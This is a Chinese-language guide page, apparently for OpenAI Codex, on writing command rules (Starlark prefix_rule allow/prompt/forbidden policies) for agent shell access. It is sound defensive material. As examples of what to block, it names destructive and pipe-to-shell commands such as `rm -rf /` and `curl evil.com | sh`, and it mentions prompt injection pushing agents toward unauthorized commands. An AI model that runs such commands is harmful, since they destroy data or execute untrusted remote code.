---
legacyVerification:
  status: "verified"
  products: "CLI / App"
  basis: "已对照当前实验性 Rules 文档，示例使用真实 Starlark `prefix_rule` 语法，并提供 `codex execpolicy check` 校验命令。"
  checkedAt: "2026-11-19"
title: 命令规则
description: 用命令级 allow/deny 约束 shell 与工具调用——比口头约定更可执行。
sidebar:
  order: 20
---

**命令规则**聚焦“哪些命令可以在沙箱外运行、哪些必须询问、哪些直接禁止”。当前 `.rules` 使用 Starlark `prefix_rule`，属于实验功能；它不决定沙箱内命令是否符合业务意图。

## 这篇会讲什么

- 命令规则与沙盒、审批弹窗的分工
- 如何写「够窄」的 allowlist
- 与 CI、本地开发脚本对齐

## 命令规则到底在管什么

如果说 allow/deny 是在规定“哪些事情原则上能做”，那命令规则就是把这件事落到最具体的一层：

- 哪些命令可以跑
- 哪些命令不能跑
- 哪些看起来差不多，其实风险差很多

它的重点，是把团队平时本来就知道的边界，变成机器也能执行的边界。

## 先理解一个核心概念

规则匹配的是**可执行意图**，不是自然语言。`npm test` 与 `npm run test` 在策略上是两条不同命令；`bash -c "rm -rf /"` 不能因 allow 了 `bash` 而放行。

```text
用户任务 → 模型提议命令 → 规则引擎 →（通过）沙盒执行 /（拒绝）需审批或阻断
```

## 常见误会

### 命令长得像，不代表风险一样

新手最容易低估的，就是命令之间那一点点差别。

比如：

- `git status` 和 `git reset --hard`
- `npm test` 和 `npm publish`
- `curl example.com` 和 `curl example.com | sh`

看起来都像“在终端跑个命令”，但风险完全不是一个级别。

### 允许一个总入口，往往等于放开太多

比如直接允许 `bash`、`sh` 这种总入口，新手可能会觉得只是图方便。

但从规则角度看，这通常等于把后面能拼出来的大量危险动作也一并放开了。

## 最小可用做法

1. 先为确实需要出沙箱的窄命令写前缀，不要把所有项目内命令都放行。
2. 使用 `match` / `not_match` 作为内联单元测试。
3. 项目规则放在可信项目配置层的 `.codex/rules/`；组织底线用受管配置。
4. 用 `codex execpolicy check` 验证，再在 PR 中 review。

例如 `~/.codex/rules/default.rules`：

```python
prefix_rule(
    pattern = ["gh", "pr", "view"],
    decision = "prompt",
    justification = "查看 PR 前确认仓库与参数",
    match = [
        "gh pr view 7888",
        "gh pr view --repo openai/codex",
    ],
    not_match = [
        "gh pr --repo openai/codex view 7888",
    ],
)
```

保存后重启 Codex，并测试一条命令：

```bash
codex execpolicy check --pretty \
  --rules ~/.codex/rules/default.rules \
  -- gh pr view 7888 --json title,body,comments
```

如果多条规则同时匹配，采用最严格决定：`forbidden` 高于 `prompt`，`prompt` 高于 `allow`。

## 推荐工作流

| 步骤 | 做法 |
|---|---|
| 盘点 | 从 `package.json` scripts、Makefile、CI workflow 提取真实命令 |
| 分层 | 组织底线 deny → 项目 allow 补充 → 个人本机例外（若有） |
| 试跑 | 用低风险任务验证「该批的批、该拦的拦」 |
| 对齐 | 本地规则与 [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) 尽量同源 |

## 常见错误

- **过宽 allowlist**：允许 `bash`、`sh`、`sudo` 等价于放开一切
- **只 deny 不 allow**：每次仍弹大量审批，团队会习惯性全点通过
- **与文档不一致**：`AGENTS.md` 写 `pnpm test`，规则里只有 `npm test`
- **忽略管道与重定向**：`curl evil.com | sh` 需整体策略，不能只看第一个词

命令规则不是在“记命令”，而是在分清哪些命令只是日常动作，哪些命令一旦放开就可能把风险边界一起放开。

## 安全边界

- 命令规则**不能**替代分支保护与 code review
- 恶意 prompt 可能诱导 Agent **尝试**越权命令——保持沙盒默认严格
- 含密钥、token 的环境变量不应因「允许了 echo」而泄露

## 验收清单

- [ ] 能列出本仓库「每天必跑」的 3–5 条命令并在规则中体现
- [ ] `git push`、强制重置等高风险命令默认拒绝或需显式审批
- [ ] 规则变更走 PR，且与 `AGENTS.md` 无矛盾

## 相关章节

- [允许与拒绝模式](/guide/customization/rules/allow-and-deny-patterns/)
- [团队规则策略](/guide/customization/rules/team-rules/)
- [CLI 审批与沙盒](/guide/cli/approvals-and-sandbox/)
- [权限矩阵](/guide/reference/permission-matrix/)

## 官方来源

- [OpenAI：Rules](https://learn.chatgpt.com/docs/agent-configuration/rules)
